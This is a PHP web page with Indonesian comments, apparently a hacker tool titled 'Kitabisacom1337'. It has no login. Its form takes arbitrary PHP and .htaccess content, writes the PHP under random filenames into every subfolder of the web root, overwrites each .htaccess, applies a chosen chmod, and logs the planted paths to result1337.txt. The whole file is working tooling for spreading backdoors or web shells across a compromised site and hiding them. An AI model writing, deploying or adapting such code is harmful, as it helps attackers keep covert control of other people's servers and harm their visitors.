<?php
// Fungsi untuk mendapatkan semua subfolder di dalam folder tertentu
function getAllFolders($dir) {
    $folders = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $file) {
        if ($file->isDir()) {
            $folders[] = $file->getRealPath();
        }
    }
    return $folders;
}

// Fungsi untuk menulis file ke setiap folder
function writeToFile($path, $filename, $content, $chmod = null) {
    $filePath = $path . DIRECTORY_SEPARATOR . $filename;
    file_put_contents($filePath, $content);

    // Jika chmod diatur, ubah permission file
    if (!is_null($chmod)) {
        chmod($filePath, octdec($chmod));
    }
}

// Fungsi untuk menghasilkan nama file acak
function generateRandomFilename($length = 10) {
    return bin2hex(random_bytes($length / 2)) . '.php';
}

// Jika form di-submit
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $phpContent = isset($_POST['php_content']) ? $_POST['php_content'] : '';
    $htaccessContent = isset($_POST['htaccess_content']) ? $_POST['htaccess_content'] : '';
    $chmodValue = isset($_POST['chmod_value']) ? $_POST['chmod_value'] : null;

    // Folder root public_html, ganti sesuai dengan struktur server Anda
    $rootFolder = __DIR__;

    // Dapatkan semua subfolder di dalam public_html
    $allFolders = getAllFolders($rootFolder);

    // Array untuk menyimpan hasil
    $resultDetails = [];

    // Masukkan file PHP dan .htaccess ke semua folder
    foreach ($allFolders as $folder) {
        $fileAdded = false;
        $randomFilename = generateRandomFilename(); // Generate random filename

        if (!empty($phpContent)) {
            writeToFile($folder, $randomFilename, $phpContent, $chmodValue);
            $fileAdded = true; // File PHP ditambahkan
            $resultDetails[] = "Sukses Upload Di $folder/$randomFilename"; // Simpan detail
        }
        if (!empty($htaccessContent)) {
            writeToFile($folder, '.htaccess', $htaccessContent, $chmodValue);
            $fileAdded = true; // File .htaccess ditambahkan
        }
    }

    // Tampilkan hasil setelah proses penyebaran file
    echo "<h2>Hasil Penyebaran File:</h2>";
    echo "<ul>";
    $resultText = "Hasil Penyebaran File:\n\n";
    foreach ($resultDetails as $detail) {
        echo "<li>$detail</li>";
        $resultText .= "$detail\n"; // Simpan hasil dalam teks untuk ditulis ke file
    }
    echo "</ul>";

    // Simpan hasil ke dalam file result1337.txt
    $resultFilePath = $rootFolder . DIRECTORY_SEPARATOR . 'result1337.txt';
    file_put_contents($resultFilePath, $resultText);
    echo "<p>Hasil telah disimpan ke dalam file <strong>result1337.txt</strong> di direktori root.</p>";
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kitabisacom1337</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #333;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        form {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            margin: 0 auto;
        }
        label {
            font-weight: bold;
            margin-top: 10px;
            display: block;
            color: #555;
        }
        textarea, input[type="text"], input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        textarea {
            resize: vertical;
        }
        input[type="submit"] {
            background-color: #5cb85c;
            color: white;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #4cae4c;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-top: 20px;
        }
        ul {
            list-style: none;
            padding: 0;
            max-width: 600px;
            margin: 20px auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }
        li {
            padding: 8px;
            border-bottom: 1px solid #eee;
        }
        li:last-child {
            border-bottom: none;
        }
        p {
            text-align: center;
            color: #555;
        }
    </style>
</head>
<body>
    <div style="text-align: center; margin-bottom: 0px;">
    <img src="https://i.ibb.co.com/H4XfdZC/image.png" alt="Logo" style="max-width: 10%; height: auto;">
</div>

    
    <form method="post" action="">
        <!-- Konten File PHP -->
        <label for="php_content">Masukkan Konten File PHP:</label><br>
        <textarea id="php_content" name="php_content" rows="10" cols="50" placeholder="Masukkan konten PHP di sini" required></textarea><br><br>
        
        <!-- Konten File .htaccess -->
        <label for="htaccess_content">Masukkan Konten File .htaccess:</label><br>
        <textarea id="htaccess_content" name="htaccess_content" rows="10" cols="50" placeholder="Masukkan konten .htaccess di sini" required></textarea><br><br>

        <!-- Custom CHMOD -->
        <label for="chmod_value">Masukkan Nilai CHMOD (contoh: 0755):</label><br>
        <input type="text" id="chmod_value" name="chmod_value" placeholder="0755" required><br><br>

        <!-- Tombol Submit -->
        <input type="submit" value="Sebarkan ke Semua Folder">
    </form>
</body>
</html>
